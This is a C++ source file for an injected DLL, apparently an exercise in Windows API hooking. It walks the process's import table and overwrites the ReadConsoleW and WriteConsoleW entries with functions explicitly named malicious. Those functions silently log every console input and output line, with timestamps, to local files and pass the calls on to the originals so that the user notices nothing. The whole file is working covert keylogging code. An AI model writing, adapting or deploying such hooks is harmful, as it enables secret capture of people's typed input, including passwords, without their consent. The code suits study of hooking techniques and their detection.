// injected-2.cpp : Defines the exported functions for the DLL application.
#define _CRT_SECURE_NO_WARNINGS
#include <fstream>
#include <ctime>
#include <algorithm>

#include "injected-2.h"

/*
	PatchIAT
	Input:
		string const& const wantedFunctionName:
			The function we want to patch.
			This is a reference to a constant string since we only read it.
		string const& const wantedDllName:
			The dll file containing the function we want to patch.
			This is a reference to a constant string since we only read it.
		MyMalicious const& const func:
			We patch IAT of ReadConsoleW and WriteConsoleW, we use this enum to differntiate both cases
			This is a reference to a constant string since we only read it.
	Output:
		Nothing (void)
	Functionality:
		This function patches the IAT of the given wantedFunctionName in the given wantedDllName,
		and replace it with the coresponding function based on the given func.
*/
void PatchIAT(string const& wantedFunctionName, string const& wantedDllName, MyMalicious const& func) 
{
	//Get pointer to wantedFunction function
	void** pFunc = getFunctionAddress(wantedFunctionName, wantedDllName);
	
	//Variable to preserve old rights of page
	DWORD old_rights; 
	
	// Change Page permissions and save the old_rights for future preserve
	VirtualProtect(pFunc, sizeof(void*), PAGE_EXECUTE_READWRITE, &old_rights); 

	// We patch IAT of ReadConsoleW and WriteConsoleW, we use this function for both cases
	// so we identify the cases using the MyMalicious enum 
	switch (func)
	{
		// The ReadConsoleW function change
	case _MyMaliciousReadConsoleW:
		*pFunc = MyMaliciousReadConsoleW; 
		break;
		// The WriteConsoleW function change
	case _MyMaliciousWriteConsoleW:
		*pFunc = MyMaliciousWriteConsoleW; 
		break;
	default:
		break;
	}
	//Preserve old rights of page base on the old_rights
	VirtualProtect(pFunc, sizeof(void*), old_rights, NULL); 
}

/*
	getFunctionAddress
	Input:
		string const& const wantedFunctionName:
			The function we want to patch.
			This is a reference to a constant string since we only read it.
		string const& const wantedDllName:
			The dll file containing the function we want to patch.
			This is a reference to a constant string since we only read it.
	Output:
		A pointer to the function we found, or 0 if we couldn't find it.
	Functionality:
		Finds the import descriptor and searches for the pointer to wantedFunctionName in the wantedDllName.
*/
void** getFunctionAddress(string const& wantedFunctionName, string const& wantedDllName) 
{
	//Get base address of current exe
	HMODULE const hModule = GetModuleHandle(NULL);
	if (hModule == NULL)
		return 0;

	//Get pointer to DOS header
	IMAGE_DOS_HEADER const* const pDOSHeader = reinterpret_cast<IMAGE_DOS_HEADER const* const>(hModule);
	if (pDOSHeader == nullptr)
		return 0;

	// We use this casting many times so we do it one time here
	BYTE const* const b_pDOSHeader = reinterpret_cast<BYTE const* const>(pDOSHeader);

	//Get pointer to NT header
	IMAGE_NT_HEADERS const* const pNTHeader = reinterpret_cast<IMAGE_NT_HEADERS const* const>(b_pDOSHeader + pDOSHeader->e_lfanew);
	if (pNTHeader == NULL)
		return 0;

	//Get pointer to import descriptor
	IMAGE_IMPORT_DESCRIPTOR* const pImportDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR* const>(const_cast<BYTE * const>(b_pDOSHeader) + pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	if (pImportDesc == NULL)
		return 0;

	//Go over DLLs
	for (IMAGE_IMPORT_DESCRIPTOR const* pCurrentDll = pImportDesc; pCurrentDll != 0; pCurrentDll++) {
		if (pCurrentDll->Name == 0) 
			break;

		string const name(reinterpret_cast<char const* const>(pDOSHeader) + pCurrentDll->Name);

		// Output to the debug stream
		OutputDebugStringA(("[INFO] DLL name: " + name).c_str());
		
		if (!_stricmp(name.c_str(), wantedDllName.c_str())) {
			// Found wantedDllName
			//Get pointer to FirstThunk (IAT) and OriginalFirstThunk (INT)
			IMAGE_THUNK_DATA const* const pCurrentThunk = reinterpret_cast<IMAGE_THUNK_DATA const* const>(b_pDOSHeader + pCurrentDll->FirstThunk);
			IMAGE_THUNK_DATA const* const pOriginalFirstThunk = reinterpret_cast<IMAGE_THUNK_DATA const* const>(b_pDOSHeader + pCurrentDll->OriginalFirstThunk);

			//Go over IAT and INT and find function
			for (int i = 0; (pOriginalFirstThunk + i)->u1.AddressOfData != NULL; i++) {
				IMAGE_IMPORT_BY_NAME const* const pImportByName = reinterpret_cast<IMAGE_IMPORT_BY_NAME const* const>(b_pDOSHeader + (pOriginalFirstThunk + i)->u1.AddressOfData);
				string const functionName(pImportByName->Name);
				if (functionName == wantedFunctionName) {
					// Output to the debug stream
					OutputDebugStringA(("[INFO] Found: " + functionName).c_str());
					return (void**)(pCurrentThunk + i);
				}
				// Output to the debug stream
				OutputDebugStringA(("[INFO] Current function name: " + functionName).c_str());
			}
		}
	}
	return 0;
}

/* 
	MyMaliciousReadConsoleW
	Input (taken from ReadConsoleW for compatability): 
		hConsoleInput[in]:	A handle to the console input buffer.
		lpBuffer[out]:		A pointer to a buffer that receives the data read from the console input buffer.
							The storage for this buffer is allocated from a shared heap for the process that is 64 KB in size.
							The maximum size of the buffer will depend on heap usage.
		nNumberOfCharsToRead[in]:	
							The number of characters to be read.
							The size of the buffer pointed to by the lpBuffer parameter should be at least nNumberOfCharsToRead * sizeof(TCHAR) bytes.
		lpNumberOfCharsRead[out]:	
							A pointer to a variable that receives the number of characters actually read.
		pInputControl[in, optional]:	
							A pointer to a CONSOLE_READCONSOLE_CONTROL structure that specifies a control character to signal the end of the read operation.
							This parameter can be NULL.
	Output:
		Calls the real ReadConsoleW function with the same input parameters.
		If the function succeeds, the return value is nonzero.
		If the function fails, the return value is zero (to get extended error information, call GetLastError).
	Functionality:
		write the lpBuffer to a file and then performs the original ReadConsoleW operation
*/
BOOL WINAPI MyMaliciousReadConsoleW(
	_In_     HANDLE  hConsoleInput,
	_Out_    LPVOID  lpBuffer,
	_In_     DWORD   nNumberOfCharsToRead,
	_Out_    LPDWORD lpNumberOfCharsRead,
	_In_opt_ PCONSOLE_READCONSOLE_CONTROL  pInputControl)
{
	// This is the call to the malicouse function
	writeToFile("benign_in.txt", static_cast<LPCWSTR const>(lpBuffer), _MyMaliciousReadConsoleW, "[INPUT ] > ");

	// We then call the original function to seem benign to the user
	return ReadConsole(hConsoleInput, lpBuffer, nNumberOfCharsToRead, lpNumberOfCharsRead, pInputControl);
}

/*
	MyMaliciousWriteConsoleW
	Input (taken from WriteConsoleW for compatability):
		hConsoleOutput [in]:	A handle to the console screen buffer. 
		lpBuffer [in]:			A pointer to a buffer that contains characters to be written to the console screen buffer.
								The storage for this buffer is allocated from a shared heap for the process that is 64 KB in size. 
								The maximum size of the buffer will depend on heap usage.
		nNumberOfCharsToWrite [in]:
								The number of characters to be written. 
								If the total size of the specified number of characters exceeds the available heap, the function fails with ERROR_NOT_ENOUGH_MEMORY.
		lpNumberOfCharsWritten [out]:
								A pointer to a variable that receives the number of characters actually written.
		lpReserved:				Reserved; must be NULL.
	Output:					
		If the function succeeds, the return value is nonzero.
		If the function fails, the return value is zero (to get extended error information, call GetLastError).
	Functionality:
		Performs the origina, WriteConsoleW operation and then write the same lpBuffer to a file
*/
BOOL WINAPI MyMaliciousWriteConsoleW(
	_In_             HANDLE  hConsoleOutput,
	_In_       const VOID    *lpBuffer,
	_In_             DWORD   nNumberOfCharsToWrite,
	_Out_            LPDWORD lpNumberOfCharsWritten,
	_Reserved_       LPVOID  lpReserved)
{
	// We first call the original function to seem benign to the user
	BOOL const ret = WriteConsole(hConsoleOutput, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, lpReserved);

	// This is the call to the malicouse function
	writeToFile("benign_out.txt", static_cast<LPCWSTR const>(lpBuffer), _MyMaliciousWriteConsoleW, "[OUTPUT] > ");
	return ret;
}

/*
	writeToFile
	Input:
		string const& const _Filename:
			The file to which we write to.
			This is a reference to a constant string since we only read it.
		LPCWSTR const lpBuffer:
			The buffer containing the output we want to write to the file.
		MyMalicious const& const func
			We patch IAT of ReadConsoleW and WriteConsoleW, we use this enum to differntiate both cases
			This is a reference to a constant string since we only read it.
		string const& const opening:
			An opional parameter for an opening to each line in the written output file.
			default is nullptr (i.e., no opening).
	Output:
		Nothing (void)
	Functionality:
		Open the file at _Filename in append mode, print lpBuffer line by line, starting with a timestamp,
		then openening then the first line in lpBuffer. Read buffer untill reach delimiter detrmined using func.
*/
void writeToFile(string const& _Filename, LPCWSTR const lpBuffer, MyMalicious const& func, string const& opening)
{
	// We maliciously write to file both the ReadConsoleW and WriteConsoleW, we use this function for both cases
	// so we identify the cases using the MyMalicious enum. Each case has a different delimiter
	char delimiter;
	switch (func)
	{
		// The ReadConsoleW function delimiter
	case _MyMaliciousReadConsoleW:
		delimiter = '\r';
		break;
		// The WriteConsoleW function delimiter
	case _MyMaliciousWriteConsoleW:
		delimiter = '\0';
		break;
	default:
		break;
	}

	// The output file, we open in append mode
	ofstream file;
	file.open(_Filename, ios::app);

	// We add timestamp to the printouts
	time_t timev = time(NULL);
	char * const s_asctime = asctime(localtime(&timev));
	// Removes _all_ new lines, since asctime includes a newline at the end
	*std::remove(s_asctime, s_asctime + strlen(s_asctime), '\n') = '\0'; 
	file << "[" << s_asctime << "]" << " " << opening.c_str();

	// We print lpBuffer one char at a time until we reach our delimiter.
	// Since we might want to print multiple lines.
	LPCWSTR it = lpBuffer;
	while (it[0] != delimiter)
	{
		file << string(it, it + 1).c_str();
		it++;
	}

	// The read console stream does not include a newline at the end so we add it
	if (func == _MyMaliciousReadConsoleW)
		file << endl;

	// Close the file
	file.close();
}

